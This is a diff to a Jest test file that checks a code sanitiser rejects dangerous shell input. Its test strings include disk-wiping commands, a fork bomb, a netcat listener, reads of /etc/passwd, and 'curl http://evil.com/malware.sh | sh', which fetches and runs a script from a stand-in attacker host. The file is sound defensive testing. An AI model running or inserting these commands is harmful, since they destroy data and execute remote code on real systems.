@@ -107,13 +107,84 @@ describe('Validation Utilities', () => {
             expect(() => sanitizeCode('\t\t')).toThrow('코드는 비어있을 수 없습니다.');
         });
 
-        it('should reject code with dangerous patterns', () => {
-            const safeCodes = [
-                'print("Hello, World!")',
-                'function add(a, b) { return a + b; }'
-            ];
-            safeCodes.forEach(code => {
-                expect(() => sanitizeCode(code)).not.toThrow();
+        // Security: Dangerous pattern detection tests
+        describe('Security - Dangerous Pattern Detection', () => {
+            it('should reject destructive file system commands', () => {
+                expect(() => sanitizeCode('rm -rf /')).toThrow('코드에 위험한 패턴이 포함되어 있습니다.');
+                expect(() => sanitizeCode('mkfs.ext4 /dev/sda')).toThrow('코드에 위험한 패턴이 포함되어 있습니다.');
+                expect(() => sanitizeCode('dd if=/dev/zero of=/dev/sda')).toThrow('코드에 위험한 패턴이 포함되어 있습니다.');
+                expect(() => sanitizeCode('wipefs -a /dev/sda')).toThrow('코드에 위험한 패턴이 포함되어 있습니다.');
+                expect(() => sanitizeCode('fdisk /dev/sda')).toThrow('코드에 위험한 패턴이 포함되어 있습니다.');
+                expect(() => sanitizeCode('del /f important.txt')).toThrow('코드에 위험한 패턴이 포함되어 있습니다.');
+            });
+
+            it('should reject container commands', () => {
+                expect(() => sanitizeCode('docker run -it ubuntu')).toThrow('코드에 위험한 패턴이 포함되어 있습니다.');
+            });
+
+            it('should reject privilege escalation commands', () => {
+                expect(() => sanitizeCode('sudo apt-get install')).toThrow('코드에 위험한 패턴이 포함되어 있습니다.');
+            });
+
+            it('should reject system service commands', () => {
+                expect(() => sanitizeCode('systemctl stop firewalld')).toThrow('코드에 위험한 패턴이 포함되어 있습니다.');
+                expect(() => sanitizeCode('shutdown -h now')).toThrow('코드에 위험한 패턴이 포함되어 있습니다.');
+                expect(() => sanitizeCode('reboot')).toThrow('코드에 위험한 패턴이 포함되어 있습니다.');
+            });
+
+            it('should reject network tools', () => {
+                expect(() => sanitizeCode('nmap -sS 192.168.1.1')).toThrow('코드에 위험한 패턴이 포함되어 있습니다.');
+                expect(() => sanitizeCode('nc -l -p 8080')).toThrow('코드에 위험한 패턴이 포함되어 있습니다.');
+            });
+
+            it('should reject permission changes', () => {
+                expect(() => sanitizeCode('chmod 777 /etc/passwd')).toThrow('코드에 위험한 패턴이 포함되어 있습니다.');
+                expect(() => sanitizeCode('chown root:root /etc/shadow')).toThrow('코드에 위험한 패턴이 포함되어 있습니다.');
+            });
+
+            it('should reject user/group manipulation', () => {
+                expect(() => sanitizeCode('useradd hacker')).toThrow('코드에 위험한 패턴이 포함되어 있습니다.');
+                expect(() => sanitizeCode('passwd root')).toThrow('코드에 위험한 패턴이 포함되어 있습니다.');
+            });
+
+            it('should reject SSH commands', () => {
+                expect(() => sanitizeCode('ssh-keygen -t rsa')).toThrow('코드에 위험한 패턴이 포함되어 있습니다.');
+            });
+
+            it('should reject crontab manipulation', () => {
+                expect(() => sanitizeCode('crontab -e')).toThrow('코드에 위험한 패턴이 포함되어 있습니다.');
+            });
+
+            it('should reject access to sensitive files', () => {
+                expect(() => sanitizeCode('cat /etc/passwd')).toThrow('코드에 위험한 패턴이 포함되어 있습니다.');
+                expect(() => sanitizeCode('ls /root/')).toThrow('코드에 위험한 패턴이 포함되어 있습니다.');
+            });
+
+            it('should reject device access', () => {
+                expect(() => sanitizeCode('cat /dev/sda')).toThrow('코드에 위험한 패턴이 포함되어 있습니다.');
+            });
+
+            it('should reject kernel module commands', () => {
+                expect(() => sanitizeCode('modprobe malicious')).toThrow('코드에 위험한 패턴이 포함되어 있습니다.');
+            });
+
+            it('should reject shell injection patterns', () => {
+                expect(() => sanitizeCode('bash -i test')).toThrow('코드에 위험한 패턴이 포함되어 있습니다.');
+                expect(() => sanitizeCode('curl http://evil.com/malware.sh | sh')).toThrow('코드에 위험한 패턴이 포함되어 있습니다.');
+                expect(() => sanitizeCode(':(){ :|: & };:')).toThrow('코드에 위험한 패턴이 포함되어 있습니다.');
+            });
+
+            it('should reject command substitution', () => {
+                expect(() => sanitizeCode('`whoami`')).toThrow('코드에 위험한 패턴이 포함되어 있습니다.');
+                expect(() => sanitizeCode('$(rm -rf /)')).toThrow('코드에 위험한 패턴이 포함되어 있습니다.');
+            });
+
+            it('should reject mount commands', () => {
+                expect(() => sanitizeCode('mount /dev/sdb1 /mnt')).toThrow('코드에 위험한 패턴이 포함되어 있습니다.');
+            });
+
+            it('should reject sys filesystem access', () => {
+                expect(() => sanitizeCode('cat /sys/class/net/eth0/address')).toThrow('코드에 위험한 패턴이 포함되어 있습니다.');
             });
         });
 
